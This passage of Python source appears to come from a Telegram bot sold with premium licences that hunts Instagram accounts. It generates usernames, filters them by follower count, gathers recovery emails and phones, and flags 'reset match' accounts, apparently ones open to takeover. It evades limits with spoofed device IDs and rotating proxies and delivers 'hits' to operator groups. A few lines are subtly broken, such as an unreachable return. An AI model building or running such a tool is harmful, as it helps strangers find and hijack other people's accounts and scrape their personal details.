        hits_count = hit
        error_count = errors
        min_followers = MIN_FOLLOWERS
        timeout_value = TIMEOUT
        thread_count = THREAD_COUNT
        events = list(event_log)

    success_rate = (valid_count / generated * 100) if generated else 0.0
    hit_rate = (hits_count / generated * 100) if generated else 0.0
    valid_ratio = (hits_count / valid_count * 100) if valid_count else 0.0
    active_threads = len(worker_threads) or thread_count
    tp = get_throughput_metrics()

    events_block = ""
    visible_events = _operator_visible_events(events)
    if visible_events:
        recent = "\n".join(
            f"  {S['bullet']} {html.escape(e[-68:])}" for e in visible_events[-3:]
        )
        events_block = tg_section("LIVE FEED") + recent

    live_line = ""
    if LIVE_WATCH:
        if LIVE_PANEL.get("view") == "stats":
            live_line = (
                f"\n{S['on']} <b>Live</b>  <code>refresh / {LIVE_WATCH_INTERVAL}s</code>\n"
            )
        else:
            live_line = (
                f"\n{S['off']} <b>Live</b>  <i>armed {S['dash']} paused "
                f"{S['dash']} open {S['btn_dash']} Stats</i>\n"
            )

    return (
        format_panel_header()
        + f"<b>Status</b>  {tg_state_badge()}   <b>Uptime</b>  <code>{uptime}</code>\n"
        + live_line
        + tg_section("SESSION")
        + tg_row("Generated", f"{generated:,}")
        + tg_row("Valid", f"{valid_count:,}")
        + tg_row("Hits", f"{hits_count:,}")
        + tg_row("Errors", f"{error_count:,}")
        + tg_section("SPEED")
        + tg_row("Gen/min", f"{tp['gen_per_min']:.1f}")
        + tg_row("Hits/hr", f"{tp['hits_per_hr']:.1f}")
        + tg_section("PERFORMANCE")
        + f"  {S['bullet']} Success  <code>{success_rate:5.1f}%</code>  {tg_progress(success_rate)}\n"
        + f"  {S['bullet']} Hit      <code>{hit_rate:5.1f}%</code>  {tg_progress(hit_rate)}\n"
        + f"  {S['bullet']} Conv.    <code>{valid_ratio:5.1f}%</code>  {tg_progress(valid_ratio)}\n"
        + tg_section("RUNTIME")
        + tg_row("Service", f"http://{ip}:{port}")
        + tg_row("Min target", f"{_min_followers_display()} followers")
        + tg_row("Timeout", f"{timeout_value}s")
        + tg_row("Workers", f"{active_threads}/{thread_count}")
        + events_block
        + f"\n<i>{S['bullet']} Tap Stats to refresh · enable auto-refresh in More.</i>"
    )


def format_analytics():
    uptime = format_duration((datetime.now(timezone.utc) - START_TIME).total_seconds())
    tp = get_throughput_metrics()
    with lock:
        generated = tp["generated"]
        hits_count = tp["hits_count"]
        valid_count = tp["valid_count"]
        error_count = tp["error_count"]

    success_rate = (valid_count / generated * 100) if generated else 0.0
    hit_rate = (hits_count / generated * 100) if generated else 0.0
    valid_ratio = (hits_count / valid_count * 100) if valid_count else 0.0

    hits_file = "hits.txt"
    archive_size = 0
    if os.path.exists(hits_file):
        archive_size = os.path.getsize(hits_file)

    return (
        format_panel_header()
        + f"<b>{S['btn_analytics']} Analytics</b>\n\n"
        + tg_row("Uptime", uptime)
        + tg_section("THROUGHPUT")
        + tg_row("Checks/min", f"{tp['gen_per_min']:.2f}")
        + tg_row("Hits/hour", f"{tp['hits_per_hr']:.2f}")
        + tg_row("Avg sec/gen", f"{tp['avg_sec_per_gen']:.2f}s")
        + tg_row("Error rate", f"{tp['err_pct']:.2f}%")
        + tg_section("FUNNEL")
        + tg_row(f"Generated {S['arrow']} Valid", f"{success_rate:.2f}%")
        + tg_row(f"Generated {S['arrow']} Hit", f"{hit_rate:.2f}%")
        + tg_row(f"Valid {S['arrow']} Hit", f"{valid_ratio:.2f}%")
        + tg_section("ARCHIVE")
        + tg_row("hits.txt", f"{archive_size:,} bytes")
        + tg_row("Hit alerts", "always on")
        + tg_row("Live panel", "on" if LIVE_WATCH else "off")
    )


def format_health():
    ok, detail, latency_ms = check_backend_health()
    badge = (
        f"<code>{S['on']} ONLINE</code>" if ok else f"<code>{S['off']} OFFLINE</code>"
    )
    return (
        format_panel_header()
        + f"<b>{S['btn_health']} Backend Health</b>\n\n"
        + f"  {S['bullet']} Status    {badge}\n"
        + tg_row("Endpoint", f"http://{ip}:{port}")
        + tg_row("Latency", f"{latency_ms}ms")
        + tg_row("Detail", detail)
    )


def format_reset_confirm():
    return (
        format_panel_header()
        + f"<b>{S['btn_reset']} Reset Session Stats</b>\n\n"
        + "Counters (generated, valid, hits, errors) will zero out.\n"
        + "<b>hits.txt is not deleted.</b>\n\n"
        + "<i>Confirm below or cancel.</i>"
    )


def format_logout_confirm():
    support = resolve_support_contact_html()
    return (
        format_panel_header()
        + f"<b>{S['btn_logout']} Log out</b>\n\n"
        + "<b>This clears everything linked on this device:</b>\n"
        + f"  {S['bullet']} Telegram bot session\n"
        + f"  {S['bullet']} Hit group binding\n"
        + f"  {S['bullet']} Cloud device profile (archived)\n"
        + f"  {S['bullet']} Local saved credentials\n\n"
        + "<b>All data will be removed from this installation.</b>\n"
        + f"<i>Recovery is possible — contact support: {support}</i>\n\n"
        + "<i>Tap <b>Yes, log out</b> to confirm, or <b>Cancel</b> to stay logged in.</i>"
    )


def format_settings():
    with lock:
        min_followers = MIN_FOLLOWERS
        timeout_value = TIMEOUT
        thread_count = THREAD_COUNT
    return (
        format_panel_header()
        + f"<b>{S['btn_set']} Runtime Configuration</b>\n\n"
        + tg_row("Min followers", _min_followers_display())
        + tg_row("Request timeout", f"{timeout_value}s")
        + tg_row("Worker threads", str(thread_count))
        + tg_row("Backend", f"{ip}:{port}")
        + tg_row("Hit alerts", "always on")
        + tg_row("Live dashboard", "on" if LIVE_WATCH else "off")
        + "\n"
        + f"<b>{S['bullet']} Quick</b>  {S['btn_down']}/{S['btn_up']} Min  ·  {S['btn_plus']} Threads\n\n"
        + f"<b>{S['bullet']} Commands</b>\n"
        + f"  {S['bullet']} <code>/set min 25</code>\n"
        + f"  {S['bullet']} <code>/set timeout 45</code>\n"
        + f"  {S['bullet']} <code>/set threads 30</code>\n\n"
        + "<i>Changes apply instantly without restart.</i>"
    )


def format_help():
    return (
        format_panel_header()
        + f"<b>{S['btn_guide']} Command Reference</b>\n\n"
        + tg_section("NAVIGATION")
        + f"  {S['bullet']} <code>/start</code>  {S['dash']} Welcome panel\n"
        + f"  {S['bullet']} <code>/stats</code>  {S['dash']} Live dashboard\n"
        + f"  {S['bullet']} <code>/settings</code>  {S['dash']} Config\n"
        + f"  {S['bullet']} <code>/hits</code>  {S['dash']} Recent captures\n"
        + f"  {S['bullet']} <code>/saved</code>  {S['dash']} ★ favorites → favorites.txt\n"
        + f"  {S['bullet']} <code>/hitgroup</code>  {S['dash']} Link hit delivery group\n"
        + f"  {S['bullet']} <code>/verifyhitgroup</code>  {S['dash']} Confirm bot admin\n"
        + f"  {S['bullet']} <code>/help</code>  {S['dash']} This guide\n"
        + f"  {S['bullet']} <code>/status</code>  {S['dash']} One-tap snapshot\n"
        + f"  {S['bullet']} <code>/check</code>  {S['dash']} Full health check + fixes\n"
        + f"  {S['bullet']} <code>/api</code>  {S['dash']} Gateway probe\n"
        + f"  {S['bullet']} <code>/cloud</code>  {S['dash']} Supabase sync\n"
        + tg_section("CONTROL")
        + f"  {S['bullet']} <code>/pause</code>  {S['dash']} Freeze workers\n"
        + f"  {S['bullet']} <code>/resume</code>  {S['dash']} Resume hunt\n"
        + tg_section("TUNING")
        + f"  {S['bullet']} <code>/set min &lt;n&gt;</code>\n"
        + f"  {S['bullet']} <code>/set timeout &lt;sec&gt;</code>\n"
        + f"  {S['bullet']} <code>/set threads &lt;n&gt;</code>\n"
        + tg_section("PROFILE")
        + f"  {S['bullet']} <code>/profile</code>  {S['dash']} Operator card\n"
        + f"  {S['bullet']} <code>/leaderboard</code>  {S['dash']} Session ranks\n"
        + f"  {S['bullet']} <code>/badges</code>  {S['dash']} Achievements\n"
        + tg_section("TOOLS")
        + f"  {S['bullet']} <code>/lookup gmail email</code>\n"
        + f"  {S['bullet']} <code>/lookup insta email</code>\n"
        + f"  {S['bullet']} <code>/gen 1-5 min</code>  {S['dash']} Max 5 · min ≤5000\n"
        + tg_section("MORE")
        + f"  {S['bullet']} <code>/analytics</code>  {S['dash']} Deep stats\n"
        + f"  {S['bullet']} <code>/health</code>  {S['dash']} Backend ping\n"
        + f"  {S['bullet']} <code>/export</code>  {S['dash']} Send hits.txt\n"
        + f"  {S['bullet']} <code>/saved</code>  {S['dash']} Send favorites.txt (★ fav list)\n"
        + f"  {S['bullet']} <code>/live on|off</code>  {S['dash']} Auto-refresh\n"
        + f"  {S['bullet']} <code>/reset</code>  {S['dash']} Zero counters\n"
        + tg_section("PLAN")
        + f"  {S['bullet']} <code>/plan</code>  {S['dash']} Free trial & daily quota\n"
        + f"  {S['bullet']} <code>/redeem KEY</code>  {S['dash']} Upgrade to Premium\n"
        + f"  {S['bullet']} <code>/mylicense</code>  {S['dash']} Premium expiry & status\n"
        + tg_section("ACCOUNT")
        + f"  {S['bullet']} <code>/logout</code>  {S['dash']} Log out (confirmation required)\n"
        + tg_section("GROUPS")
        + f"  {S['bullet']} Same commands work in your hit group (linked account only)\n"
        + f"  {S['bullet']} Privacy ON → use <code>/stats@YourBot</code> style\n"
        + f"  {S['bullet']} INPARETO admins can also use this bot (DM or group)\n"
        + f"  {S['bullet']} Others in the group cannot control your bot\n\n"
        + "<i>Use inline buttons for one-tap access.</i>"
    )


def format_startup():
    started = datetime.now(timezone.utc).strftime("%d %b %Y · %H:%M UTC")
    return (
        format_panel_header()
        + f"<b>{S['on']} Client Online</b>\n\n"
        + f"<i>{S['bullet']} Developed by S Crew · bridge connected.</i>\n"
        + tg_row("Started", started)
        + tg_row("Service", f"http://{ip}:{port}")
        + tg_row("Workers", str(THREAD_COUNT))
        + tg_row("Timeout", f"{TIMEOUT}s")
        + tg_row("Min", f"{_min_followers_display()} followers")
        + "\n"
        + "<i>Open the dashboard or pause anytime from the panel below.</i>"
    )


def format_action_notice(title, detail, tag="OK", *, detail_html=None):
    if detail_html is None:
        detail_html = any(
            token in str(detail)
            for token in ("<code>", "<b>", "<i>", "<a ", "<pre>", "</")
        )
    detail_body = detail if detail_html else html.escape(str(detail))
    return (
        format_panel_header()
        + f"<b>{S['bullet']} {html.escape(tag)}</b>  {html.escape(title)}\n\n"
        + f"{detail_body}\n\n"
        + f"<b>State</b>  {tg_state_badge()}"
    )


def format_hits_message(limit=2):
    raw = get_last_hits(limit)
    if raw == "No saved hits available.":
        return (
            format_panel_header()
            + f"<b>{S['btn_hits']} Hit Archive</b>\n\n"
            + "<i>No captures saved yet. They will appear here automatically.</i>"
        )
    body = html.escape(raw)
    if len(body) > 3500:
        body = body[-3500:] + "\n…"
    return (
        format_panel_header()
        + f"<b>{S['btn_hits']} Recent Captures</b>\n\n"
        + f"<pre>{body}</pre>"
    )


def create_hit_keyboard(username):
    profile_url = f"https://www.instagram.com/{username}"
    fav_label = "★ In favorites" if is_favorite_username(username) else "★ Add to fav"
    return {
        "inline_keyboard": [
            [
                {"text": f"{S['btn_profile']} Open profile", "url": profile_url},
                {"text": fav_label, "callback_data": f"FAV:{username[:48]}"},
            ],
        ]
    }


HIT_BOX_VALUE_GAP = 4
HIT_BOX_TAIL_PAD = 30
HIT_BOX_TAIL_OPTIONS = (30, 24, 18, 12, 8, 6, 4, 3, 0)
HIT_BOX_MAX_CORE_LEN = 30
HIT_BOX_NBSP = "\u00a0"
HIT_HEADER_INNER_W = 24


def _tg_utf16_len(text):
    """Telegram caption/text limits count UTF-16 code units."""
    return len((text or "").encode("utf-16-le")) // 2


def _hit_box_pad(label, label_w):
    text = str(label)
    if len(text) >= label_w:
        return text
    return text + (HIT_BOX_NBSP * (label_w - len(text)))


def _hit_box_body(label, value, label_w):
    val = str(value if value is not None else "-").strip() or "-"
    gap = HIT_BOX_NBSP * HIT_BOX_VALUE_GAP
    return f"{_hit_box_pad(label, label_w)}{gap}{val}"


def _hit_row_prefix(label, label_w):
    return f"{_hit_box_pad(label, label_w)}{HIT_BOX_NBSP * HIT_BOX_VALUE_GAP}"


def _hit_trim_field_value(prefix, value_plain, max_core):
    """Keep rows narrow enough for mobile blockquote — avoids wrap gaps."""
    budget = max_core - len(prefix)
    if budget < 1:
        return str(value_plain)[:1]
    vp = str(value_plain)
    if len(vp) <= budget:
        return vp
    return vp[: budget - 1] + "…"


def _hit_box_effective_max_body(bodies):
    raw = max((len(b) for b in bodies), default=0)
    return min(raw, HIT_BOX_MAX_CORE_LEN)


def _hit_quality_display(quality_stars, *, pending=False):
    if pending:
        return "···"
    stars = max(1, min(5, int(quality_stars or 1)))
    return f"{'★' * stars}{'☆' * (5 - stars)} ({stars}star)"


def _hit_row_suffix(prefix, value_plain, max_body, *, tail_pad=HIT_BOX_TAIL_PAD):
    pad = max_body - len(prefix) - len(value_plain)
    if pad > 0:
        return HIT_BOX_NBSP * pad
    return ""


def _hit_render_quote_line(
    prefix, value_plain, max_body, *, value_html=None, strike=False, tail_pad=HIT_BOX_TAIL_PAD,
):
    value_plain = _hit_trim_field_value(prefix, value_plain, max_body)
    row = prefix + value_plain
    if len(row) < max_body:
        row += HIT_BOX_NBSP * (max_body - len(row))
    tail = " " * tail_pad
    if strike:
        # No <code> — mono blocks <s>; plain quote text + outer strike wrapper.
        if value_html:
            pad = max_body - len(prefix) - len(value_plain)
            pad_part = (HIT_BOX_NBSP * pad) if pad > 0 else ""
            return (
                f"{html.escape(prefix)}"
                f"<tg-spoiler>{html.escape(value_plain)}</tg-spoiler>"
                f"{html.escape(pad_part)}{tail}"
            )
        return html.escape(row) + tail
    if value_html:
        pad_part = _hit_row_suffix(prefix, value_plain, max_body, tail_pad=tail_pad)
        return (
            f"<code>{html.escape(prefix)}</code>"
            f"{value_html}"
            f"<code>{html.escape(pad_part)}</code>{tail}"
        )
    return f"<code>{html.escape(row)}</code>{tail}"


def _hit_box_label_width(raw_groups):
    return max(len(str(label)) for group in raw_groups for label, _ in group)


def _hit_box_format_groups(raw_groups, *, strike=False, tail_pad=HIT_BOX_TAIL_PAD):
    label_w = _hit_box_label_width(raw_groups)
    bodies = [
        _hit_box_body(label, value, label_w)
        for group in raw_groups
        for label, value in group
    ]
    max_body = _hit_box_effective_max_body(bodies)
    out = []
    for group in raw_groups:
        group_rows = []
        for label, value in group:
            prefix = _hit_row_prefix(label, label_w)
            value_plain = str(value)
            if label == "Username":
                line = _hit_render_quote_line(
                    prefix,
                    value_plain,
                    max_body,
                    value_html=f"<tg-spoiler>{html.escape(value_plain)}</tg-spoiler>",
                    strike=strike,
                    tail_pad=tail_pad,
                )
            else:
                line = _hit_render_quote_line(
                    prefix, value_plain, max_body, strike=strike, tail_pad=tail_pad,
                )
            group_rows.append(line)
        out.append(group_rows)
    return out


def _hit_quote_pre_box(rows):
    """One blockquote; merge plain rows into a single <code> block (mobile-safe)."""
    if isinstance(rows, str):
        rows = [line for line in rows.splitlines() if line.strip()]
    rows = [str(row) for row in rows]
    if any("<tg-spoiler>" in r for r in rows):
        return f"<blockquote>{chr(10).join(rows)}</blockquote>"

    cores = []
    tail = ""
    for row in rows:
        if row.startswith("<code>") and "</code>" in row:
            core, _, rest = row.partition("</code>")
            cores.append(core[len("<code>"):])
            if rest:
                tail = rest
        else:
            cores.append(row)
    if cores:
        return f"<blockquote><code>{chr(10).join(cores)}</code>{tail}</blockquote>"
    return f"<blockquote>{chr(10).join(rows)}</blockquote>"


def _hit_caption_header_box(*, tail_pad=HIT_BOX_TAIL_PAD):
    bar = "━" * HIT_HEADER_INNER_W
    tail = " " * tail_pad
    top = html.escape(f"┏{bar}┓")
    mid = (
        f"┃ {html.escape(TG_BRAND)} · "
        f"<i>{html.escape(TG_TAGLINE)}</i>"
        f"{html.escape(tail)}"
    )
    bot = html.escape(f"┗{bar}┛")
    return f"<b>{top}\n{mid}\n{bot}</b>"


def _hit_caption_footer_ts(timestamp):
    ts = (timestamp or datetime.now(timezone.utc).strftime("%d %b %Y • %H:%M UTC")).upper()
    return f"<b>[ {html.escape(ts)} ]</b>"


def _hit_operator_plain():
    uid = resolve_operator_telegram_id() or str(TELEGRAM_CHAT_ID or "").strip()
    if not uid:
        return "—"
    info = fetch_telegram_user(uid) or lookup_telegram_user_display(uid)
    if info and info.get("display_name"):
        return str(info["display_name"])[:28]
    if info and info.get("username"):
        return f"@{info['username']}"
    return uid


def _hit_support_plain():
    admin_load_settings()
    admin_ids = [str(a) for a in _admin_settings.get("admin_ids", []) if a]
    if not admin_ids:
        return "—"
    info = lookup_telegram_user_display(admin_ids[0])
    if info and info.get("username"):
        return f"@{info['username']}"
    return admin_ids[0]


def _hit_channel_plain():
    admin_load_settings()
    return "@" + (_admin_settings.get("channel_username") or "inpareto").lstrip("@")


def _hit_box_row_groups(
    username,
    name,
    followers,
    following,
    posts_display,
    quality_stars,
    contact_details,
    *,
    pending=False,
):
    quality = _hit_quality_display(quality_stars, pending=pending)
    joined = (contact_details.get("joined") or "").strip() or "—"
    email = (contact_details.get("email") or "").strip() or "—"
    phone = (contact_details.get("phone") or "").strip() or "—"
    if pending:
        email = email if email != "—" else "···"
        phone = phone if phone != "—" else "···"
    uname = (username or "").strip().lstrip("@")
    return [
        [
            ("Username", f"@{uname}"),
            ("Name", name or "—"),
        ],
        [
            ("Followers", followers),
            ("Following", following),
            ("Posts", "···" if pending else posts_display),
            ("Quality", quality),
        ],
        [
            ("Joined", joined),
            ("Email", email),
            ("Phone", phone),
        ],
        [
            ("Operator", _hit_operator_plain()),
            ("User ID", resolve_operator_id(TELEGRAM_CHAT_ID) or "—"),
            ("Support", _hit_support_plain()),
            ("Channel", _hit_channel_plain()),
        ],
    ]


def _hit_strike_quotes(username, contact_details):
    """Strike all quote boxes when phone linked or reset match fails (gmail + letters)."""
    details = contact_details or {}
    phone = (details.get("phone") or "").strip()
    email = (details.get("email") or "").strip()
    if phone:
        return True
    if email and not _username_email_letters_match(username, email):
        return True
    return False


def _build_box_hit_caption_parts(
    raw_groups,
    timestamp,
    *,
    strike=False,
    tail_pad=HIT_BOX_TAIL_PAD,
):
    groups = _hit_box_format_groups(raw_groups, strike=strike, tail_pad=tail_pad)
    parts = [_hit_caption_header_box(tail_pad=tail_pad)]
    quote_boxes = [_hit_quote_pre_box(group) for group in groups]
    quotes = "\n".join(quote_boxes)
    if strike:
        quotes = f"<s>{quotes}</s>"
    parts.append(quotes)
    parts.append(_hit_caption_footer_ts(timestamp))
    return parts


def _build_box_hit_caption(
    username,
    name,
    followers,
    following,
    posts_display,
    quality_stars,
    contact_details,
    timestamp,
    *,
    pending=False,
):
    raw_groups = _hit_box_row_groups(
        username,
        name,
        followers,
        following,
        posts_display,
        quality_stars,
        contact_details,
        pending=pending,
    )
    strike = (not pending) and _hit_strike_quotes(username, contact_details)
    caption = ""
    for tail_pad in HIT_BOX_TAIL_OPTIONS:
        parts = _build_box_hit_caption_parts(
            raw_groups, timestamp, strike=strike, tail_pad=tail_pad,
        )
        caption = "".join(parts)
        if _tg_utf16_len(caption) <= TG_CAPTION_LIMIT:
            return caption
    return caption


def format_hit_caption_extras():
    """Operator ID, admin support contact, and brand channel on hit alerts."""
    admin_load_settings()
    op_id = resolve_operator_id(TELEGRAM_CHAT_ID)
    lines = [tg_section("SESSION")]
    if op_id:
        lines.append(f"  {S['bullet']} <b>You</b>  {telegram_profile_link_html(op_id)}\n")
        lines.append(tg_row("Your ID", op_id))
    else:
        lines.append(f"  {S['bullet']} <b>You</b>  <code>not linked</code>\n")
    if _admin_settings.get("admin_ids"):
        lines.append(f"  {S['bullet']} <b>Support</b>  {resolve_support_contact_html()}\n")
    else:
        lines.append(f"  {S['bullet']} <b>Support</b>  <i>admin not set</i>\n")
    lines.append(f"  {S['bullet']} <b>Channel</b>  {admin_channel_tag()}\n")
    return "".join(lines)


def _mask_hit_email(value):
    v = (value or "").strip()
    if not v or "@" not in v:
        return ""
    if "*" in v or "•" in v:
        return v
    local, domain = v.split("@", 1)
    local, domain = local.strip(), domain.strip()
    if not local or not domain:
        return ""
    if len(local) <= 2:
        masked_local = local[0] + "*"
    else:
        masked_local = local[0] + ("*" * (len(local) - 2)) + local[-1]
    return f"{masked_local}@{domain}"


def _looks_masked_hit_phone(value):
    v = (value or "").strip()
    return bool(v) and any(ch in v for ch in ("*", "•", "x", "X"))


def _mask_hit_phone(value):
    """Only show IG-provided masked phones — never fabricate from digits."""
    v = (value or "").strip()
    if not _is_valid_ig_recovery_phone(v):
        return ""
        return v


def _hit_phone_for_display(value):
    return _mask_hit_phone(value)


def _joined_year_from_ig_info(info):
    if not info:
        return ""
    for key in ("pk", "id", "pk_id"):
        raw = info.get(key)
        if raw is None:
            continue
        label = _estimate_join_year_from_user_id(str(raw))
        if label:
            return str(label)
    return ""


_HIT_WEB_UA = (
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36"
)


def _hit_profile_http_get(url, *, params=None, headers=None, timeout=15):
    """Isolated GET — own IP first, proxy fallback."""
    for attempt, proxies in enumerate(_hit_proxy_attempts(proxy_tries=_HIT_POSTS_FETCH_RETRIES)):
        _hit_proxy_retry_pause(attempt)
        try:
            resp = requests.get(
                url,
                params=params,
                headers=headers or {},
                timeout=timeout,
                proxies=proxies,
            )
            status = getattr(resp, "status_code", 0) if resp is not None else 0
            if _hit_http_status_proxy_retry(status):
                if proxies:
                    hit_proxy_mark_bad(proxies)
                continue
            return resp
        except Exception:
            if proxies:
                hit_proxy_mark_bad(proxies)
            continue
            return None


def _hit_profile_tls_get(url, *, params=None, headers=None, timeout=20):
    """Profile GET — own IP first, then curl/tls/requests via proxy."""
    http, backend = _new_hit_http_session()
    for attempt, proxies in enumerate(_hit_proxy_attempts(proxy_tries=_HIT_POSTS_FETCH_RETRIES)):
        _hit_proxy_retry_pause(attempt)
        try:
            return _hit_http_get(
                http, backend, url,
                params=params or {}, headers=headers or {}, timeout=timeout,
                proxies=proxies,
            )
        except Exception:
            if proxies:
                hit_proxy_mark_bad(proxies)
            continue
        return None


def _fetch_hit_mobile_web_profile(username):
    """web_profile_info via hunt mobile session — works on Termux (requests)."""
    username = (username or "").strip().lstrip("@")
    if not username:
        return {}

    def _profile_get(http, backend, app_id, csrf="", proxies=None):
        headers = _hit_mobile_profile_headers()
        headers["X-IG-App-ID"] = app_id
        if csrf:
            headers["X-CSRFToken"] = csrf
        try:
            return _hit_http_get(
                http, backend, _HIT_LOOKUP_PROFILE_URL,
                params={"username": username},
                headers=headers,
                timeout=25,
                proxies=proxies,
            )
        except Exception:
            return None

    sessions: list[tuple[object, str, str]] = []
    http, backend = _new_hit_http_session()
    sessions.append((http, backend, ""))
    if backend == "requests" and not _IS_TERMUX:
        warm = requests.Session()
        csrf = ""
        try:
            warm.get(
                "https://www.instagram.com/",
                headers={"User-Agent": _HIT_WEB_UA},
                timeout=12,
            )
            csrf = warm.cookies.get("csrftoken") or ""
        except Exception:
            pass
        sessions.append((warm, "requests", csrf))

    app_ids = (_HIT_LOOKUP_MOBILE_APP_ID,)
    if not _IS_TERMUX:
        app_ids = (_HIT_LOOKUP_MOBILE_APP_ID, "936619743392459")

    for http, backend, csrf in sessions:
        for app_id in app_ids:
            for attempt, proxies in enumerate(
                _hit_proxy_attempts(proxy_tries=_HIT_POSTS_FETCH_RETRIES),
            ):
                _hit_proxy_retry_pause(attempt)
                resp = _profile_get(http, backend, app_id, csrf, proxies)
                if resp is None:
                    if proxies:
                        hit_proxy_mark_bad(proxies)
                    continue
                status = getattr(resp, "status_code", 0)
                if _hit_http_status_proxy_retry(status):
                    if proxies:
                        hit_proxy_mark_bad(proxies)
                    continue
                if status == 200:
                    try:
                        user = (resp.json().get("data") or {}).get("user") or {}
                    except (ValueError, TypeError, AttributeError):
                        user = {}
                    if user:
                        return user
    return {}


def _hit_mobile_profile_headers(*, with_device_ids: bool = True):
    headers = {
        "X-IG-App-ID": _HIT_LOOKUP_MOBILE_APP_ID,
        "User-Agent": _HIT_LOOKUP_MOBILE_UA,
        "Accept-Language": "en-IN, en-US",
        "Accept": "*/*",
    }
    if with_device_ids:
        headers["X-IG-Android-ID"] = "android-" + secrets.token_hex(8)
        headers["X-IG-Device-ID"] = str(uuid.uuid4())
        headers["X-IG-Family-Device-ID"] = str(uuid.uuid4())
    return headers


def _parse_posts_count_from_html(text):
    if not text:
        return None
    for pattern in (
        _HIT_PROFILE_MEDIA_COUNT_RE,
        _HIT_PROFILE_MEDIA_EDGE_RE,
        _HIT_PROFILE_POSTS_COUNT_RE,
    ):
        match = pattern.search(text)
        if match:
            try:
                return int(match.group(1))
            except (TypeError, ValueError):
                continue
    return None


def _merge_ig_info_profile_fields(info, username=None):
    """Use fields already returned by /ig_gen before any extra IG calls."""
    info = dict(info or {})
    username = (username or info.get("username") or "").strip().lstrip("@")
    hd = info.get("hd_profile_pic_url_info")
    if isinstance(hd, dict):
        url = (hd.get("url") or "").strip()
        if url.startswith("http"):
            info.setdefault("profile_pic_url_hd", url)
            info.setdefault("profile_pic_url", url)
    for key in ("profile_pic_url_hd", "profile_pic_url"):
        url = (info.get(key) or "").strip()
        if url.startswith("http"):
            info.setdefault("profile_pic_url", url)
            break
    if not (info.get("full_name") or "").strip() and username:
        info["full_name"] = username
    return info


def _fetch_hit_profile_via_gateway(username, pk=None, *, fast=False):
    """Local endpoint — dedicated IG session + mobile headers for real media_count."""
    base = get_api_base_url()
    if not base:
        return {}
    params = {"username": username}
    if pk:
        params["pk"] = str(pk)
    last_status = None
    max_attempts = 1 if fast else _HIT_POSTS_FETCH_RETRIES
    connect_timeout = min(HUNT_CONNECT_TIMEOUT, 4 if _IS_TERMUX else HUNT_CONNECT_TIMEOUT)
    read_timeout = 10 if (fast and _IS_TERMUX) else (20 if _IS_TERMUX else 24)
    sem_wait = 2.5 if _IS_TERMUX else 1.5
    if not _hit_endpoint_enrich_sem.acquire(blocking=True, timeout=sem_wait):
        return {}
    try:
        for attempt in range(max_attempts):
            if attempt:
                time.sleep(1.0 * attempt)
            try:
                with _hit_gateway_sem:
                    resp = _hit_api_session.get(
                        f"{base}/ig_profile",
                        params=params,
                        timeout=(connect_timeout, read_timeout),
                    )
                last_status = resp.status_code
                if resp.ok:
                    return resp.json() or {}
                if resp.status_code == 404:
                    log_event(
                        "HIT PROFILE",
                        "endpoint missing /ig_profile — git pull endpoint.py and restart start-api.sh",
                    )
                    return {}
            except Exception as exc:
                last_status = str(exc)[:40]
                if attempt + 1 >= max_attempts:
                    log_event("HIT PROFILE", f"ig_profile error: {str(exc)[:80]}")
        if last_status is not None:
            log_event("HIT PROFILE", f"ig_profile HTTP {last_status}")
        return {}
    finally:
        _hit_endpoint_enrich_sem.release()


def _scrape_posts_count_from_profile_page(username):
    """Last-resort posts count — parse public profile HTML with proxy retries."""
    username = (username or "").strip().lstrip("@")
    if not username:
        return None
    url = f"https://www.instagram.com/{quote(username)}/"
    mobile_headers = {
        **_hit_mobile_profile_headers(),
        "Accept": "text/html",
    }
    web_headers = {
        "User-Agent": _HIT_WEB_UA,
        "Accept-Language": "en-US,en;q=0.9",
        "Accept": "text/html",
    }
    for headers in (mobile_headers, web_headers):
        for _ in range(_HIT_POSTS_FETCH_RETRIES):
            tls_resp = _hit_profile_tls_get(url, headers=headers, timeout=22)
            if tls_resp is not None and getattr(tls_resp, "status_code", 0) == 200:
                mc = _parse_posts_count_from_html(getattr(tls_resp, "text", "") or "")
                if mc is not None:
                    return mc
            resp = _hit_profile_http_get(url, headers=headers, timeout=18)
            if resp is not None and resp.ok:
                mc = _parse_posts_count_from_html(resp.text or "")
                if mc is not None:
                    return mc
            time.sleep(0.8 + random.uniform(0.2, 0.6))
    return None


def _apply_gateway_profile_to_info(info, profile):
    if not profile:
        return info
    info = dict(info or {})
    name = (profile.get("full_name") or "").strip()
    if name:
        info["full_name"] = name
    mc = profile.get("media_count")
    if mc is None or mc == "":
        edge = profile.get("edge_owner_to_timeline_media")
        if isinstance(edge, dict) and edge.get("count") is not None:
            mc = edge.get("count")
    if mc is not None and mc != "":
        info["media_count"] = mc
    edge_followers = profile.get("edge_followed_by")
    if isinstance(edge_followers, dict) and edge_followers.get("count") is not None:
        info.setdefault("follower_count", edge_followers.get("count"))
    edge_following = profile.get("edge_follow")
    if isinstance(edge_following, dict) and edge_following.get("count") is not None:
        info.setdefault("following_count", edge_following.get("count"))
    for key in ("profile_pic_url_hd", "profile_pic_url"):
        url = (profile.get(key) or "").strip()
        if url.startswith("http"):
            info[key] = url
            break
    hd = profile.get("hd_profile_pic_url_info")
    if isinstance(hd, dict):
        url = (hd.get("url") or "").strip()
        if url.startswith("http"):
            info["profile_pic_url_hd"] = url
            info.setdefault("profile_pic_url", url)
    return info


def _fetch_ig_web_profile(username):
    """Name, pfp, posts — mobile API first (Termux-safe), then proxy HTTP fallback."""
    username = (username or "").strip().lstrip("@")
    if not username:
        return {}
    user = _fetch_hit_mobile_web_profile(username)
    if user:
        return user
    attempts = (
        {"X-IG-App-ID": _HIT_LOOKUP_MOBILE_APP_ID, "User-Agent": _HIT_LOOKUP_MOBILE_UA},
        {"X-IG-App-ID": "936619743392459", "User-Agent": _HIT_WEB_UA},
    )
    for headers in attempts:
        for retry in range(_HIT_POSTS_FETCH_RETRIES):
            if retry:
                time.sleep(1.5 * retry + random.uniform(0.3, 0.8))
            resp = _hit_profile_http_get(
                _HIT_LOOKUP_PROFILE_URL,
                params={"username": username},
                headers=headers,
                timeout=16,
            )
            if resp is None:
                continue
            if resp.status_code in (429, 502, 503, 504):
                continue
            if resp.ok:
                try:
                    user = (resp.json().get("data") or {}).get("user") or {}
                except (ValueError, TypeError, AttributeError):
                    user = {}
                if user:
                    return user
    return {}


def _profile_pic_url_from_ig_info(info, username=None):
    info = info or {}
    for key in ("profile_pic_url_hd", "profile_pic_url"):
        url = (info.get(key) or "").strip()
        if url.startswith("http"):
            return url
